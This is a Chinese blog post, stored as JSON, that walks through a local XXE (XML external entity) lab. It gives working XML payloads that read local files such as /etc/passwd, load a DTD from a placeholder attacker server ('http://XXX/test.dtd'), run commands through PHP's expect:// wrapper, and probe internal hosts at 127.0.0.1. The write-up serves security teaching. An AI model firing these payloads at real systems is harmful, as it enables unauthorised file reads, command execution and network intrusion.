{"title":"XXE本地靶场","uid":"b0d1a06dcd6e0826834acbe52fab1564","slug":"XXE本地靶场","date":"2022-06-06T00:54:30.000Z","updated":"2022-06-06T02:24:04.412Z","comments":true,"path":"api/articles/XXE本地靶场.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00-XXE-Lab\"><a href=\"#0x00-XXE-Lab\" class=\"headerlink\" title=\"0x00 XXE-Lab\"></a>0x00 XXE-Lab</h2><h3 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>随便输入用户名和密码抓包观察：<br><img src=\"/post/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA.htm/image-20220606090958094.png\" alt=\"image-20220606090958094\"></p>\n<p><img src=\"/post/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA.htm/image-20220606091018608.png\" alt=\"image-20220606091018608\"></p>\n<p>可以看到用户名和密码是使用<code>XML</code>格式进行传输，并且数据包中<code>Content-Type:</code> 字段为<code>application/xml;charset=utf-8</code>带有<code>xml</code>字样，<code>X-Requested-With:</code> 字段为<code>XMLHttpRequest</code>是<code>XML</code>的<code>HTTP</code>请求，回复包中也是<code>XML</code>格式，由此就能看出存在XXE漏洞。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p>进行XXE注入：</p>\n<p>构造payload：读取D盘下的test.txt文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">直接构造XML声明和DTD部分，引用外部实体去尝试读取&#x2F;etc&#x2F;passwd文件：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE admin [\n&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;]&gt;\n&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;\n这里元素中引用外部实体参数admin，格式：&amp;admin;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA.htm/image-20220606093623495.png\" alt=\"image-20220606093623495\"></p>\n<p>这里除了读取test.txt文件，也可以读取一些敏感文件，可结合XXE实现任意文件读取漏洞。</p>\n<h2 id=\"0x02-构造payload的几种方式\"><a href=\"#0x02-构造payload的几种方式\" class=\"headerlink\" title=\"0x02 构造payload的几种方式\"></a>0x02 构造payload的几种方式</h2><p><strong>方式一、直接通过外部实体声明：</strong></p>\n<p>XML内容：</p>\n<pre class=\"line-numbers language-xml-dtd\" data-language=\"xml-dtd\"><code class=\"language-xml-dtd\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE a [  \n&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; \n&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><strong>方式二、外部实体声明（通用实体）+外部DTD文件：</strong></p>\n<pre class=\"line-numbers language-xml-dtd\" data-language=\"xml-dtd\"><code class=\"language-xml-dtd\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;XXX&#x2F;test.dtd&quot;&gt;\n&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：这里的 <a href=\"http://xxx/test.dtd\">http://XXX/test.dtd</a> 是攻击者自己服务器上的文件。</p></blockquote>\n<p><strong>方式三、外部实体声明（参数实体） + 引入外部实体声明：</strong>：</p>\n<pre class=\"line-numbers language-xml-dtd\" data-language=\"xml-dtd\"><code class=\"language-xml-dtd\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE a[\n\t&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;XXX&#x2F;test.dtd&quot;&gt;\n\t%d;\n]&gt;\n&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>test.dtd 内容:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>注意这种方式必须要先引用参数实体，才能引用通用实体，且缺一不可。</strong></p>\n<h2 id=\"0x03-RCE\"><a href=\"#0x03-RCE\" class=\"headerlink\" title=\"0x03 RCE\"></a>0x03 RCE</h2><p>在安装 expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。<br> 因为<code>PHP的 expect</code> 并不是默认安装扩展，所以命令执行比较难利用，但不排除有幸运的情况。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;cat &#x2F;&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;\n&lt;&#x2F;root&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"0x04-内网探测\"><a href=\"#0x04-内网探测\" class=\"headerlink\" title=\"0x04 内网探测\"></a>0x04 内网探测</h2><p>XML 外部实体中是可以使用http:&#x2F;&#x2F;协议，可以利用该请求去探查内网。</p>\n<pre class=\"line-numbers language-xml-dtd\" data-language=\"xml-dtd\"><code class=\"language-xml-dtd\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;\n&lt;&#x2F;root&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>若对方禁用外部实体这样的攻击则无效。</p>\n","text":"0x00 XXE-Lab0x00随便输入用户名和密码抓包观察： 可以看到用户名和密码是使用XML格式进行传输，并且数据包中Content-Type: 字段为application/xml;charset=utf-8带有xml字样，X-Requested-With: 字段为XMLH...","link":"","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"XXE","slug":"XXE","count":4,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":4,"path":"api/tags/XXE.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-XXE-Lab\"><span class=\"toc-text\">0x00 XXE-Lab</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%9E%84%E9%80%A0payload%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">0x02 构造payload的几种方式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-RCE\"><span class=\"toc-text\">0x03 RCE</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">0x04 内网探测</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"漏洞发现-操作系统类漏洞","uid":"d10b61f7a1925f3d1f2bb509e6d073e3","slug":"漏洞发现-操作系统类漏洞","date":"2022-06-07T09:20:13.000Z","updated":"2022-06-07T09:21:06.444Z","comments":true,"path":"api/articles/漏洞发现-操作系统类漏洞.json","keywords":null,"cover":[],"text":"0x00脑图 0x01 漏洞探针系统漏洞由于手工检测操作系统漏洞很复杂很麻烦，由此利用漏洞探针工具检测漏洞。 漏扫工具：Goby,Nmap,Nessus Nmap的一些第三方漏洞库： Nmap –script&#x3D;vuln 默认 nse 插件扫描 Nmap vulscan ...","link":"","photos":[],"count_time":{"symbolsCount":424,"symbolsTime":"1 mins."},"categories":[{"name":"漏洞检测","slug":"漏洞检测","count":4,"path":"api/categories/漏洞检测.json"}],"tags":[{"name":"漏洞检测","slug":"漏洞检测","count":4,"path":"api/tags/漏洞检测.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Vulnhub-XXE靶场","uid":"d6b5c98aeeb32013f5e3f6af5fdb7e80","slug":"Vulnhub-XXE靶场","date":"2022-06-05T14:38:38.000Z","updated":"2022-06-05T16:23:18.119Z","comments":true,"path":"api/articles/Vulnhub-XXE靶场.json","keywords":null,"cover":[],"text":"0x00靶机地址：https://download.vulnhub.com/xxe/XXE.zip 攻击机：Ninjitsu OS 0x01打开靶机 0x02查看攻击机ip地址： 使用nmap扫描网段，查找靶机ip： nmap -sS 192.168.216.1&#x2F;24 ...","link":"","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[{"name":"XXE","slug":"XXE","count":4,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":4,"path":"api/tags/XXE.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}